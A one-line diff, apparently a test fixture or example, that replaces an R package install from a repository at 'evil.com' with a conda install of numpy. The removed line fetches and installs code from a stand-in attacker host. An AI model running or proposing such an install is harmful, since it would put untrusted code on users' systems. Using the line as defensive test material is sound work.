@@ -1,1 +1,1 @@
-utils::install.packages("foo", repos = "https://evil.com/cran")
+conda_install("r-env", packages = "numpy")
